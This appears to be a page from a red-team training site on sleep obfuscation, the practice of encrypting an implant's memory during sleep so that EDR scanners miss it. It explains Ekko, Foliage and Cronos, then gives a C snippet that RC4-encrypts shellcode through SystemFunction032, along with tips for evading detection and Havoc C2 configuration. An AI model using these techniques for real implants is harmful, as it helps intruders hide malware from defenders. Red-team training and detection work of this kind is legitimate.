---
layout: training-page
title: "Sleep Obfuscation — Red Team Academy"
module: "Evasion"
tags:
  - sleep-obfuscation
  - ekko
  - foliage
  - memory-encryption
  - edr-bypass
page_key: "evasion-sleep-obfuscation"
render_with_liquid: false
---

# Sleep Obfuscation

Memory scanners (Windows Defender, EDR) scan process memory during idle periods, looking for shellcode signatures. Sleep obfuscation techniques encrypt the implant's memory regions during sleep/wait periods and decrypt just before execution resumes — making the beacon invisible to scanners while dormant. Key techniques: Ekko, Foliage, Cronos, and timer-based encryption.

## The Problem: Memory Scanning

```
// EDR memory scanning workflow:
// 1. Process calls Sleep() or WaitForSingleObject() with long timeout
// 2. EDR uses ETW/callbacks to detect the long sleep
// 3. Scans the sleeping process's memory for signatures
// 4. Detects shellcode/PE patterns, kills process

// Without sleep obfuscation:
// - Beacon sits in RX memory as plaintext shellcode
// - Easily detected by YARA rules and signature scanning

// With sleep obfuscation:
// - Before sleep: encrypt implant memory with XOR/AES/RC4
// - Change memory protection to RW (no execute)
// - Sleep
// - After wake: decrypt memory, restore RX protection
// - Continue execution

// Key metrics:
// - Time window: encrypted for duration of sleep
// - Scanner sees: encrypted blob in RW memory (no signatures)
// - Challenge: who calls the decrypt routine while encrypted?
```

## Ekko — Timer-Based Sleep Obfuscation

```
// Ekko (by @5pider) — uses NT Timer Queue callbacks
// Encrypts memory using RC4 via SystemFunction032 (from advapi32)
// Uses ROP chains via NtContinue to avoid direct calls

// How Ekko works:
// 1. Create a timer queue
// 2. Queue 3 timer callbacks via RtlCreateTimer:
//    Timer 1: VirtualProtect(shellcode, PAGE_READWRITE)  ← remove execute
//    Timer 2: SystemFunction032(RC4 encrypt/decrypt)      ← encrypt
//    Timer 3: VirtualProtect(shellcode, PAGE_EXECUTE_READ) + signal event
// 3. WaitForSingleObject on event (block until all timers fire)
// 4. Memory is RW-encrypted during sleep, RX-decrypted when done

// Implementation (Ekko.c):
// https://github.com/Cracked5pider/Ekko

#include "Ekko.h"

// Call from your sleep function:
EkkoObf(5000);  // sleep 5 seconds with RC4 encryption

// Key variables to understand:
// - ImageBase: start of shellcode/PE in memory
// - ImageSize: size to encrypt
// - Key: RC4 key (generated per-call or hardcoded)
```

## Foliage — APC-Based Sleep Obfuscation

```
// Foliage (by @trickster0) — queues APCs to encrypt memory
// Uses QueueUserAPC to schedule encrypt/decrypt routines
// Less detectable than timer queues in some environments

// How Foliage works:
// 1. Create suspended thread
// 2. Queue APC: VirtualProtect RW + RC4 encrypt
// 3. Queue APC: WaitForSingleObject (actual sleep)
// 4. Queue APC: RC4 decrypt + VirtualProtect RX
// 5. Resume thread → APCs fire in order

// https://github.com/trickster0/Foliage
```

## Cronos — Stack Spoof + Sleep Obfuscation

```
// Cronos adds stack spoofing to sleep obfuscation
// Combines Ekko-style memory encryption with call stack manipulation
// During sleep: stack shows NtWaitForSingleObject called from legitimate module

// https://github.com/Idov31/Cronos

// Key additions over Ekko:
// 1. Return address on stack is overwritten with ntdll address
// 2. Stack walker sees: kernel32!Sleep ← ntdll!RtlTimerCallback
// 3. No reference to implant code in call stack during sleep
```

## Manual Sleep Obfuscation (Custom)

```
// Custom implementation using NtContinue + ROP:

// Step 1: Find image base and size
PVOID imageBase = /* your shellcode base address */;
SIZE_T imageSize = /* your shellcode size */;

// Step 2: RC4 or XOR key
BYTE key[] = { 0xDE, 0xAD, 0xBE, 0xEF, ... };
ULONG keyLen = sizeof(key);

// Step 3: VirtualProtect → PAGE_READWRITE
DWORD oldProtect;
VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &oldProtect);

// Step 4: Encrypt (using SystemFunction032 — no crypto import needed):
typedef NTSTATUS(WINAPI* _SystemFunction032)(PUNICODE_STRING, PUNICODE_STRING);
_SystemFunction032 Rc4 = GetProcAddress(GetModuleHandleA("advapi32"), "SystemFunction032");
UNICODE_STRING data = { imageSize, imageSize, (PWSTR)imageBase };
UNICODE_STRING keyStr = { keyLen, keyLen, (PWSTR)key };
Rc4(&data, &keyStr);

// Step 5: Sleep
WaitForSingleObject(GetCurrentProcess(), sleepTime);  // or NtDelayExecution

// Step 6: Decrypt (same Rc4 call — RC4 is symmetric)
Rc4(&data, &keyStr);

// Step 7: VirtualProtect → PAGE_EXECUTE_READ
VirtualProtect(imageBase, imageSize, PAGE_EXECUTE_READ, &oldProtect);
```

## Avoiding Sleep Detection

```
// Detection vectors for sleep obfuscation:

// 1. Long sleeps (suspicious dwell time)
//    Fix: Jitter — randomize sleep intervals
//    Fix: Short check-ins (under 60s) — harder to reliably scan
long sleepTime = (beaconInterval * (100 + rand() % 30)) / 100;  // ±15% jitter

// 2. Memory protection changes (RX → RW → RX)
//    EDRs monitor VirtualProtect calls via ETW
//    Fix: Use NtProtectVirtualMemory via syscall instead
//    Fix: Allocate memory as RW from the start, use CFG workarounds

// 3. Timer queue callbacks (Ekko fingerprint)
//    EDR can detect specific timer API sequence
//    Fix: Use APC-based approach (Foliage)
//    Fix: Use NtWaitForMultipleObjects variant

// 4. Consistent RC4/XOR key fingerprint
//    Fix: Generate per-session random key
//    Fix: Derive key from system info (process ID, timestamp)

// 5. PAGE_NOACCESS trick: set memory to NOACCESS during sleep
//    Access violation handler restores permissions on scan attempt
```

## Integration with Havoc / Custom Loaders

```
// Havoc C2 — sleep mask built in:
// teamserver.json config:
// "Sleep": {
//     "Technique": "WaitForSingleObjectEx",
//     "ObfuscationMethod": "EKKO"
// }

// Shellcode loaders that support sleep obfuscation:
// - BokuLoader (https://github.com/boku7/BokuLoader)
// - AceLdr
// - HavocSleep (https://github.com/trickster0/HavocSleep)

// Combining with indirect syscalls:
// 1. Indirect syscall: NtProtectVirtualMemory (avoid hook)
// 2. Ekko/Foliage for timer-based encryption
// 3. Stack spoof during NtWaitForSingleObject
// → Near-undetectable dormant implant
```

## Resources

- Ekko — `github.com/Cracked5pider/Ekko`
- Foliage — `github.com/trickster0/Foliage`
- Cronos — `github.com/Idov31/Cronos`
- Sektor7 — Sleep Obfuscation course
- MDSec — In-process sleep obfuscation blog
- SystemFunction032 — undocumented RC4 via advapi32
